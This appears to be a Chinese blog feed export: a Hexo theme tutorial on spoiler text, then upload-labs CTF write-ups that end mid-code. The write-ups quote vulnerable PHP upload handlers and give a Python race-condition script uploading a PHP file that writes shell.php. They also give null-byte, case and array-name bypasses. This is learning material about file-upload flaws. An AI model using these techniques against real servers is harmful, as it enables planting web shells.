        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>​    老早就觉得<a target="_blank" rel="noopener" href="https://zh.moegirl.org.cn/Mainpage">萌娘百科</a>里的<span class='heimu'>黑幕</span>很好玩，所以摸索着给自己博客加了一个。参考博客<a target="_blank" rel="noopener" href="https://www.cnblogs.com/send-off-a-friend/p/12355387.html">Re：萌娘百科上的黑幕实现</a>。不过我改的方法有稍稍有点不同，是把hexo渲染markdown文章中的删除线<code>~~ ~~</code>标签修改了。我回来又想到了更好的方法，markdown支持文章中的<strong>自定义标签</strong>，自己增加一个<code>&lt;span class=&#39;heimu&#39;&gt;...&lt;/span&gt;</code>标签更好。那么两种都记一下吧。当然用<strong>自定义标签</strong>的话还可以保留<strong>删除线</strong>。</p><h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><p><span class='heimu'>我刚刚去楼下售卖机买饮料发现没有用上优惠券，就很气</span></p><p><span class='heimu'><a href="">我刚刚去楼下售卖机买饮料发现没有用上优惠券，就很气</a></span></p><p><span class='heimu'><del>我刚刚去楼下售卖机买饮料发现没有用上优惠券，就很气</del></span></p><p><span class='heimu'><strong>我刚刚去楼下售卖机买饮料发现没有用上优惠券，就很气</strong></span></p><p><span class='heimu'><code>我刚刚去楼下售卖机买饮料发现没有用上优惠券，就很气</code></span></p><p>萌娘百科<a target="_blank" rel="noopener" href="https://zh.moegirl.org.cn/Template:%E9%BB%91%E5%B9%95">官方介绍</a></p><h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><p>​    先进入主题的资源文件夹<code>themes\butterfly\source\</code>，修改需要用到的文件<code>css\_global\index.styl</code>、<code>js/main.js</code>。</p><p>​    说明一下两个文件的作用：主题的总样式表<code>index.css</code>是经过整合形成的，而<strong>.styl文件是基于Node.js的CSS的预处理框架</strong>，我们会在这个里面添加黑幕的样式。<code>main.js</code>里面使用选择器为标签添加<code>title=&#39;你知道的太多了&#39;</code>，这个可以修改成自己喜欢的。</p><h2 id="修改自定义标签"><a href="#修改自定义标签" class="headerlink" title="修改自定义标签"></a>修改自定义标签</h2><ol><li>在<code>index.styl</code>文件末尾添加</li></ol><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.heimu</span>, <span class="selector-class">.heimu</span> <span class="selector-tag">a</span>, <span class="selector-tag">a</span> <span class="selector-class">.heimu</span>, <span class="selector-class">.heimu</span> <span class="selector-tag">a</span><span class="selector-class">.new</span>, <span class="selector-class">.heimu</span> code</span><br><span class="line">  <span class="attribute">background-color</span>: <span class="number">#252525</span> !important</span><br><span class="line">  <span class="attribute">color</span>: <span class="number">#252525</span> !important</span><br><span class="line">  <span class="attribute">text-shadow</span>: none</span><br><span class="line"><span class="selector-class">.heimu</span>:hover, <span class="selector-class">.heimu</span>:active,</span><br><span class="line"><span class="selector-class">.heimu</span>:hover <span class="selector-class">.heimu</span>, <span class="selector-class">.heimu</span>:active <span class="selector-class">.heimu</span>,<span class="selector-class">.heimu</span> <span class="selector-tag">code</span>:hover</span><br><span class="line">  <span class="attribute">color</span>: white !important;</span><br><span class="line"><span class="selector-class">.heimu</span>:hover <span class="selector-tag">a</span>, <span class="selector-tag">a</span>:hover <span class="selector-class">.heimu</span>,</span><br><span class="line"><span class="selector-class">.heimu</span>:active <span class="selector-tag">a</span>, <span class="selector-tag">a</span>:active <span class="selector-class">.heimu</span> </span><br><span class="line">  <span class="attribute">color</span>: lightblue !important;</span><br><span class="line"><span class="selector-class">.heimu</span>:hover <span class="selector-class">.new</span>, <span class="selector-class">.heimu</span> <span class="selector-class">.new</span>:hover, <span class="selector-class">.new</span>:hover <span class="selector-class">.heimu</span>,</span><br><span class="line"><span class="selector-class">.heimu</span>:active <span class="selector-class">.new</span>, <span class="selector-class">.heimu</span> <span class="selector-class">.new</span>:active, <span class="selector-class">.new</span>:active .heimu</span><br><span class="line">  <span class="attribute">color</span>: <span class="number">#BA0000</span> !important;</span><br></pre></td></tr></table></figure><p>因为是<code>.styl</code>的文件，缩进是很严格的，自行按照前面缩进来整理一下。上面那么多就是兼容了一下黑幕下的超链接、粗体、代码块。主要是超链接。</p><ol start="2"><li>在<code>main.js</code>的<code>unRefreshFn</code>和<code>refreshFn</code>方法之前定义<code>addheimuTitle</code>函数</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//你知道的太多了</span></span><br><span class="line"><span class="keyword">const</span> addheimuTitle = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="number">123</span>)</span><br><span class="line">  $(<span class="string">&#x27;.heimu&#x27;</span>).attr(<span class="string">&#x27;title&#x27;</span>,<span class="string">&#x27;你知道的太多了&#x27;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以<kbd>ctrl</kbd>+<kbd>f</kbd>搜索上面那两个<code>..refreshFn</code>函数，发现是整个JS中函数调用的入口，所以我们也需要把自己定义的<code>addheimuTitle</code>函数在这里面调用。我盲猜的嗷<code>refreshFn</code>这个函数是在载入页面会调用，直接在里面第二行加上</p><p><img src="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201120173713.png"></p><h2 id="修改删除线"><a href="#修改删除线" class="headerlink" title="修改删除线"></a>修改删除线</h2><p>​    修改<code>css\_layout\post.styl</code>文件，在文件中找到id为<code>#article-container</code>的元素，这个元素是文章页面中最外层的元素，我们需要在它里面添加</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-id">#article-container</span> </span><br><span class="line">.....</span><br><span class="line">.....</span><br><span class="line">  del</span><br><span class="line">    <span class="attribute">background-color</span>: <span class="number">#252525</span>;</span><br><span class="line">    <span class="attribute">color</span>: <span class="number">#252525</span>;</span><br><span class="line">    <span class="attribute">text-shadow</span>: none;</span><br><span class="line">    <span class="attribute">text-decoration</span>: none</span><br><span class="line">    &amp;:hover</span><br><span class="line">      <span class="attribute">color</span>: white !important;</span><br></pre></td></tr></table></figure><p>​    因为文章中的删除线被渲染以后页面的标签为<code>&lt;del&gt;</code>，选中id为<code>article-container</code>下的所有<code>del</code>标签添加样式，剩下的还有在<code>main.js</code>中添加<code>title</code>和上面的方法差不多，只需要把选择器修改为<code>$(&#39;#article-container del&#39;).attr(&#39;title&#39;,&#39;你知道的太多了&#39;)</code>。</p><h2 id="完工"><a href="#完工" class="headerlink" title="完工"></a>完工</h2><p>​    两种方法比较下，第一种方法可以保留删除线，但是在写文章时需要再手打一遍标签，第二种方法直接借用删除线，能省事但是删除线就用不了了。我用的第一种。</p>]]></content>
      
      
      <categories>
          
          <category> 捣腾博客 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 黑幕实现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Upload-Labs的最后几道题</title>
      <link href="2020/Upload-Labs5/"/>
      <url>2020/Upload-Labs5/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="Pass-17"><a href="#Pass-17" class="headerlink" title="Pass-17"></a>Pass-17</h2><p>​    （windows环境，php版本5.2.17，题号是18题）</p><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="literal">false</span>;</span><br><span class="line">$msg = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    $ext_arr = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">    $file_name = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    $file_ext = substr($file_name,strrpos($file_name,<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    $upload_file = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . $file_name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(move_uploaded_file($temp_file, $upload_file))&#123;</span><br><span class="line">        <span class="keyword">if</span>(in_array($file_ext,$ext_arr))&#123;</span><br><span class="line">             $img_path = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span>. rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.$file_ext;</span><br><span class="line">             rename($upload_file, $img_path);</span><br><span class="line">             $is_upload = <span class="literal">true</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            $msg = <span class="string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;</span><br><span class="line">            unlink($upload_file);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $msg = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    思路和前面的一样，获取文件信息，移动文件到<strong>upload</strong>文件夹，第12行使用了白名单验证，多了第14行的<code>rename</code>函数，看名称就是重命名的函数，所以我们可以在重命名之前访问我们上传的文件，所以这题用到了<strong>上传竞争</strong>，使用<code>python</code>脚本不断的向服务器上传文件，然后访问上传的文件，上传的文件中有一句代码<code>&lt;?php fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php phpinfo();?&gt;&#39;);?&gt;</code>这段代码执行以后，会创建一个名为<code>shell.php</code>里面有一句<code>&lt;?php phpinfo();?&gt;</code>的文件。</p><p>​    脚本代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Pool</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">CompeteUpload</span>(<span class="params">list</span>):</span></span><br><span class="line">    url=<span class="string">&quot;http://upload-labs/Pass-18/index.php&quot;</span>   <span class="comment">#上传页面</span></span><br><span class="line">    geturl=<span class="string">&quot;http://upload-labs/upload/233.php&quot;</span>     <span class="comment">#访问上传文件</span></span><br><span class="line">    file=&#123;<span class="string">&#x27;upload_file&#x27;</span>:(<span class="string">&#x27;233.php&#x27;</span>,<span class="string">&quot;&lt;?php fputs(fopen(&#x27;shell.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php phpinfo();?&gt;&#x27;);?&gt;&quot;</span>,<span class="string">&#x27;image/jpeg&#x27;</span>)&#125;</span><br><span class="line">    data=&#123;<span class="string">&#x27;submit&#x27;</span>:<span class="string">&#x27;上传&#x27;</span>&#125;</span><br><span class="line">    r=requests.post(url=url,data=data,files=file)</span><br><span class="line">    <span class="comment">#print &quot;test upload....&quot;</span></span><br><span class="line">    r1=requests.get(url=geturl)</span><br><span class="line">    <span class="keyword">if</span> r1.status_code==<span class="number">200</span>:</span><br><span class="line">        <span class="keyword">print</span> (<span class="string">&quot;upload success!&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    pool = Pool(<span class="number">10</span>)</span><br><span class="line">    pool.map(CompeteUpload, range(<span class="number">10000</span>))</span><br><span class="line">    pool.close()</span><br><span class="line">    pool.join()</span><br></pre></td></tr></table></figure><p>​    第一次用python的我在这里知道了<code>pip</code>。这道题因为要不断的上传和访问文件，所以对在线靶场不友好，所以才选择了本地环境解题。完工</p><p><img src="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201119090033.png"></p><h2 id="Pass-18（失手）"><a href="#Pass-18（失手）" class="headerlink" title="Pass-18（失手）"></a>Pass-18（失手）</h2><p>​    18题失手了没有思路，如果使用<code>include.php</code>文件包含的话还可以，看了看网上大部分的博客都是敷敷衍衍过去的，找到了一篇稍微有点思路的，使用的是<code>apache2.2.x的解析漏洞</code>，这个漏洞的思路就是，apache服务器在解析有多个后缀名的文件时，从最后一个开始向前扫描，如果不认识就跳过，直到遇到一个认识的文件后缀，就把这个文件以这个能识别的后缀解析。</p><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_32434307/article/details/79480316">Apache文件解析漏洞</a></p><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/yuzly/p/11226377.html">apache httpd多后缀解析漏洞复现</a></p><p>​    源码中还有一个可以突破的点是同样使用了<strong>重命名函数</strong>，所以应该还是可以使用竞争上传访问得到，但是使用了白名单验证，我实在是没招了所以<del>先摸为敬</del>。</p><h2 id="Pass-19"><a href="#Pass-19" class="headerlink" title="Pass-19"></a>Pass-19</h2><p>（windows环境，php5.2.17，magic_quotes_gpc=Off）</p><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="literal">false</span>;</span><br><span class="line">$msg = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">&quot;php&quot;</span>,<span class="string">&quot;php5&quot;</span>,<span class="string">&quot;php4&quot;</span>,<span class="string">&quot;php3&quot;</span>,<span class="string">&quot;php2&quot;</span>,<span class="string">&quot;html&quot;</span>,<span class="string">&quot;htm&quot;</span>,<span class="string">&quot;phtml&quot;</span>,<span class="string">&quot;pht&quot;</span>,<span class="string">&quot;jsp&quot;</span>,<span class="string">&quot;jspa&quot;</span>,<span class="string">&quot;jspx&quot;</span>,<span class="string">&quot;jsw&quot;</span>,<span class="string">&quot;jsv&quot;</span>,<span class="string">&quot;jspf&quot;</span>,<span class="string">&quot;jtml&quot;</span>,<span class="string">&quot;asp&quot;</span>,<span class="string">&quot;aspx&quot;</span>,<span class="string">&quot;asa&quot;</span>,<span class="string">&quot;asax&quot;</span>,<span class="string">&quot;ascx&quot;</span>,<span class="string">&quot;ashx&quot;</span>,<span class="string">&quot;asmx&quot;</span>,<span class="string">&quot;cer&quot;</span>,<span class="string">&quot;swf&quot;</span>,<span class="string">&quot;htaccess&quot;</span>);</span><br><span class="line"></span><br><span class="line">        $file_name = $_POST[<span class="string">&#x27;save_name&#x27;</span>];</span><br><span class="line">        $file_ext = pathinfo($file_name,PATHINFO_EXTENSION);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!in_array($file_ext,$deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> .$file_name;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123; </span><br><span class="line">                $is_upload = <span class="literal">true</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                $msg = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            $msg = <span class="string">&#x27;禁止保存为该类型文件！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    源码第七行使用了<strong>POST</strong>来接受文件的命名，前面有类似题的是使用了<strong>0x00截断上传</strong>，后面也同样是<code>move_uploaded_file</code>移动文件的函数，还使用了黑名单验证，方法就很明确，使用<strong>截断上传</strong>。别忘了截断上传需要的特定条件：php版本需要低于<code>5.3.29</code>、<code>magic_quotes_gpc</code>需要为关闭状态。</p><p><img src="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201119164220.png"></p><p>​    同样是命名为<code>phpa</code>方便在十六进制表里修改为<code>00</code></p><p><img src="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201119162729.png"></p><p>​    打开图片把url链接<code>http://upload-labs/upload/upload-19.php�</code>修改一下即可。完工</p><p><img src="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201119164458.png"></p><p>​    其实这道题还有一个思路，因为题目使用了<strong>黑名单验证</strong>，分析源码没有设置大小写过滤，所以也可以使用大小写方法通过如<code>Php</code>，不演示了。</p><h2 id="Pass-20"><a href="#Pass-20" class="headerlink" title="Pass-20"></a>Pass-20</h2><p>（LInux环境，php7.2.21）</p><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="literal">false</span>;</span><br><span class="line">$msg = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_FILES[<span class="string">&#x27;upload_file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="comment">//检查MIME</span></span><br><span class="line">    $allow_type = <span class="keyword">array</span>(<span class="string">&#x27;image/jpeg&#x27;</span>,<span class="string">&#x27;image/png&#x27;</span>,<span class="string">&#x27;image/gif&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!in_array($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>],$allow_type))&#123;</span><br><span class="line">        $msg = <span class="string">&quot;禁止上传该类型文件!&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">//检查文件名</span></span><br><span class="line">        $file = <span class="keyword">empty</span>($_POST[<span class="string">&#x27;save_name&#x27;</span>]) ? $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>] : $_POST[<span class="string">&#x27;save_name&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span> (!is_array($file)) &#123;</span><br><span class="line">            $file = explode(<span class="string">&#x27;.&#x27;</span>, strtolower($file));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $ext = end($file);</span><br><span class="line">        $allow_suffix = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (!in_array($ext, $allow_suffix)) &#123;</span><br><span class="line">            $msg = <span class="string">&quot;禁止上传该后缀文件!&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            $file_name = reset($file) . <span class="string">&#x27;.&#x27;</span> . $file[count($file) - <span class="number">1</span>];</span><br><span class="line">            $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> .$file_name;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $msg = <span class="string">&quot;文件上传成功！&quot;</span>;</span><br><span class="line">                $is_upload = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">&quot;文件上传失败！&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    $msg = <span class="string">&quot;请选择要上传的文件！&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    这道题使用了<code>MIME</code>验证和白名单验证。先看第10行使用了<code>三目运算符</code>判断<code>$_POST[&#39;save_name&#39;]</code>是否为空，若为空则执行<code>:</code>前获取上传文件的名称，若不为空则获取POST中的<code>save_name</code>。第11行使用了<code>is_array</code>函数判断是否是一个数组，然后使用<code>explode</code>截断文件名转换小写并返回数组。也就是说，如果我们POST中的<code>save_name</code>是个数组的就可以跳过11行的判断。15行使用<code>end</code>函数获取数组中的最后一个元素用于后缀验证。20行把文件名进行拼接：数组<strong>第一个</strong>元素+数组元素<strong>总数-1</strong>的那个元素。</p><p>所以我们可以构造一个这样的数组用于绕过：</p><p><img src="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201119170734.png"></p><p>​    数组[2]用于绕过白名单，文件名为：<code>数组[0].数组[1]</code>，但是数组[1]是空的所以只剩下<code>数组[0].</code>（后面有个点）</p><p>​    别忘了还要绕过<strong>MIME</strong></p><p><img src="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201119172340.png"></p><p><img src="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201119172415.png"></p><p>完工</p><h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>​    Upload labs的20道题大部分完成了，有两道题没完成，但是也学到了不少东西，这些天再抽空写一个总结吧。射射观看。</p>]]></content>
      
      
      <categories>
          
          <category> DROPS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文件上传漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Upload-Labs之Pass-16</title>
      <link href="2020/Upload-Labs4/"/>
      <url>2020/Upload-Labs4/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>​    我在这道题上花了快一天的时间，但是也学到了不少姿势，觉得东西应该足够多，而且参考了的博客发现这道题算是有歧义的，不知道作者想要考察的点是哪一个，所以算是有两种解法吧，可惜的是两种方法都不算是大成功，只有部分成功执行了。</p><p>​    参考博客：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2657#toc-4">upload-labs之pass 16详细分析</a></p><h2 id="Pass-16"><a href="#Pass-16" class="headerlink" title="Pass-16"></a>Pass-16</h2><p>​    源码（三种图片的判定，只贴一个吧，篇幅小一点）：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="literal">false</span>;</span><br><span class="line">$msg = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="comment">// 获得上传文件的基本信息，文件名，类型，大小，临时文件路径</span></span><br><span class="line">    $filename = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    $filetype = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>];</span><br><span class="line">    $tmpname = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    $target_path=UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.basename($filename);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获得上传文件的扩展名</span></span><br><span class="line">    $fileext= substr(strrchr($filename,<span class="string">&quot;.&quot;</span>),<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//判断文件后缀与类型，合法才进行上传操作</span></span><br><span class="line">    <span class="keyword">if</span>(($fileext == <span class="string">&quot;jpg&quot;</span>) &amp;&amp; ($filetype==<span class="string">&quot;image/jpeg&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($tmpname,$target_path))&#123;</span><br><span class="line">            <span class="comment">//使用上传的图片生成新的图片</span></span><br><span class="line">            $im = imagecreatefromjpeg($target_path);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>($im == <span class="literal">false</span>)&#123;</span><br><span class="line">                $msg = <span class="string">&quot;该文件不是jpg格式的图片！&quot;</span>;</span><br><span class="line">                @unlink($target_path);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">//给新图片指定文件名</span></span><br><span class="line">                srand(time());</span><br><span class="line">                $newfilename = strval(rand()).<span class="string">&quot;.jpg&quot;</span>;</span><br><span class="line">                <span class="comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class="line">                $img_path = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.$newfilename;</span><br><span class="line">                imagejpeg($im,$img_path);</span><br><span class="line">                @unlink($target_path);</span><br><span class="line">                $is_upload = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(($fileext == <span class="string">&quot;png&quot;</span>) &amp;&amp; ($filetype==<span class="string">&quot;image/png&quot;</span>))&#123;</span><br><span class="line">        ......</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(($fileext == <span class="string">&quot;gif&quot;</span>) &amp;&amp; 